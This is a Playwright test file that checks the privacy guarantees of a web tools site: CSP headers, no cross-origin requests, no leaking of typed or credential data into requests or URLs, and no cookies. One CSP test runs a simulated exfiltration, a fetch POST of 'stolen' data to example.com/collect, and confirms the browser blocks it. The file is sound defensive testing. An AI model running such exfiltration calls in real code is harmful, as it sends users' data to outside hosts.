import { expect, test } from "@playwright/test";
import { tools } from "../packages/tools/src";
import { trackRequests } from "./helpers";

const CANARY = "CANARY-secret-9f3a7c1e-do-not-leak";

test.describe("privacy guarantees", () => {
  test("every page sends a Content Security Policy that blocks third-party connections", async ({ request }) => {
    for (const path of ["/", "/tools/json-formatter", "/privacy"]) {
      const response = await request.get(path);
      const csp = response.headers()["content-security-policy"] ?? "";
      expect(csp, path).toContain("default-src 'self'");
      expect(csp, path).toContain("connect-src 'self'");
      expect(csp, path).toContain("object-src 'none'");
      expect(csp, path).toContain("frame-ancestors 'none'");
      expect(response.headers()["x-content-type-options"]).toBe("nosniff");
      expect(response.headers()["permissions-policy"]).toContain("camera=()");
    }
  });

  test("the CSP is actually enforced by the browser", async ({ page, baseURL }) => {
    await page.goto("/tools/json-formatter");
    const violations: string[] = [];
    await page.exposeFunction("reportViolation", (v: string) => violations.push(v));
    await page.evaluate(() => {
      document.addEventListener("securitypolicyviolation", (e) => void (window as unknown as { reportViolation: (v: string) => void }).reportViolation(`${e.violatedDirective}:${e.blockedURI}`));
    });
    const outcome = await page.evaluate(async () => {
      try {
        await fetch("https://example.com/collect", { method: "POST", body: "stolen" });
        return "sent";
      } catch {
        return "blocked";
      }
    });
    expect(outcome).toBe("blocked");
    await expect.poll(() => violations.length).toBeGreaterThan(0);
    expect(violations[0]).toContain("connect-src");
    void baseURL;
  });

  test("no tool page requests anything from another origin", async ({ page, baseURL }) => {
    test.setTimeout(240_000);
    const tracker = trackRequests(page);
    for (const tool of tools) {
      await page.goto(`/tools/${tool.slug}`, { waitUntil: "networkidle" });
      await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
    }
    expect(tracker.external(baseURL!).map((r) => r.url())).toEqual([]);
  });

  test("text typed into tools is never transmitted", async ({ page }) => {
    const tracker = trackRequests(page);
    const cases: [string, string][] = [
      ["/tools/json-formatter", "JSON"],
      ["/tools/base64-encoder", "Input"],
      ["/tools/hash-generator", "Text to hash"],
      ["/tools/case-converter", "Text"],
      ["/tools/word-counter", "Your text"],
    ];
    for (const [path, label] of cases) {
      await page.goto(path);
      await page.getByLabel(label, { exact: true }).fill(`"${CANARY}"`);
      await page.waitForTimeout(700); // let debounced work and URL-hash sync finish
    }
    expect(tracker.containing(CANARY).map((r) => `${r.method()} ${r.url()}`)).toEqual([]);
  });

  test("shared state is stored after the # so it never reaches the server", async ({ page }) => {
    const tracker = trackRequests(page);
    await page.goto("/tools/case-converter");
    await page.getByLabel("Text", { exact: true }).fill(CANARY);
    await expect.poll(() => page.url()).toContain("#s=");
    await page.reload();
    // The browser strips the fragment from every request URL.
    expect(tracker.all.filter((r) => r.url().includes("#"))).toEqual([]);
    expect(tracker.containing(CANARY)).toEqual([]);
  });

  test("credentials are never mirrored into the URL", async ({ page }) => {
    await page.goto("/tools/jwt-decoder");
    await page.getByLabel("Encoded token").fill("eyJhbGciOiJIUzI1NiJ9.eyJzZWNyZXQiOiJ4In0.sig");
    await page.waitForTimeout(700);
    expect(page.url()).not.toContain("#");

    await page.goto("/tools/qr-code-generator");
    await page.getByLabel("What should the QR code contain?").selectOption("wifi");
    await page.getByLabel("Network name (SSID)").fill("Home");
    await page.getByLabel("Password").fill("hunter2-super-secret");
    await expect.poll(() => page.url()).toContain("#s=");
    expect(decodeURIComponent(page.url())).not.toContain("hunter2");
    const hash = new URL(page.url()).hash.slice(3);
    expect(Buffer.from(hash.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8")).not.toContain("hunter2");
  });

  test("the site sets no cookies", async ({ page, context }) => {
    await page.goto("/");
    await page.goto("/tools/json-formatter");
    await page.goto("/requests");
    expect(await context.cookies()).toEqual([]);
  });

  test("the privacy page documents what is stored", async ({ page }) => {
    await page.goto("/privacy");
    await expect(page.getByRole("heading", { name: "Verify it yourself in 60 seconds" })).toBeVisible();
    await expect(page.getByRole("heading", { name: "What does reach our server" })).toBeVisible();
  });
});
